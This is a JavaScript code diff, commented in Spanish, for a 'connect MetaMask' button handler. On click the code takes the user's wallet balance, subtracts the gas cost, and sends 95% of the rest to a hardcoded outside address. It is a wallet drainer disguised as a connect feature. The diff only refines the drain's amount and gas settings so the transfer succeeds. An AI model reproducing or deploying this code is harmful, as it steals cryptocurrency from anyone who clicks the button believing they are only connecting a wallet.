@@ -7,18 +7,20 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
             const balance = await web3.eth.getBalance(usuarioAddress);
-            const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95;
-            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasLimit = 21000; // Este es un valor estándar para una transacción simple. Ajusta según sea necesario.
+            const gasCost = gasPrice * gasLimit;
+
+            // Asegúrate de dejar suficiente ether para cubrir el costo del gas
+            const cantidadEnviar = web3.utils.toBN(balance).sub(web3.utils.toBN(gasCost));
+            const porcentajeEnviar = cantidadEnviar.mul(web3.utils.toBN(95)).div(web3.utils.toBN(100));
 
             const tx = {
                 from: usuarioAddress,
                 to: direccionDestino,
-                value: cantidadEnviarEnWei,
-                gas: await web3.eth.estimateGas({
-                    from: usuarioAddress,
-                    to: direccionDestino,
-                    value: cantidadEnviarEnWei,
-                }),
+                value: porcentajeEnviar.toString(),
+                gas: gasLimit.toString(),
+                gasPrice: gasPrice,
             };
 
             web3.eth.sendTransaction(tx)
